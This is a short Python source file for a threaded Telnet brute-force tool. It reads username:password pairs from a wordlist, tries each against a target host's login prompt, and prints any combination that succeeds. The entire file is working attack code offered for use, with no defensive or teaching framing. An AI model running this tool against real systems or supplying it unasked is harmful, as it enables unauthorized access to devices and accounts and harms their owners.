# Python Script for Telnet Brute Force

# Importing Module
import os
import socket
import telnetlib
import threading
from colorama import init, Fore

init()
GREEN = Fore.GREEN
RESET = Fore.RESET


class TelnetBrute(threading.Thread):
    def __init__(self, target):
        threading.Thread.__init__(self)
        self.target = target

    def telnet_brute(self, hostname, username, password):
        # Initializing Telnet Client
        client = telnetlib.Telnet(hostname)

        try:
            client.read_until(b"login: ")
        except EOFError:
            print("Error: Read(login) failed")

        try:
            client.write(username.encode('ascii') + b"\n")
        except socket.error:
            print("Error: Write(username) failed")

        if password:
            try:
                client.read_until(b"Password: ")
            except EOFError:
                print("Error: Read(password) failed")

            try:
                client.write(password.encode('ascii') + b"\n")
            except socket.error:
                print("Error: Write(password) failed")

            try:
                (i, obj, byt) = client.expect([b'incorrect', b'@'], 2)
            except EOFError:
                print("Error occurred")

            if i == 1:
                print(f"{GREEN}\n[TELNET] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
                return True
            else:
                # print(f"\n[TELNET] Invalid credentials for {username}:{password}")
                pass

            client.close()
            return False

    def run(self):
        # Read the file
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "telnet_wordlist.txt")
        cred_list = open(wordlist_path).read().splitlines()

        # Start the brute force
        for cred in cred_list:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.telnet_brute(self.target, username, password):
                break
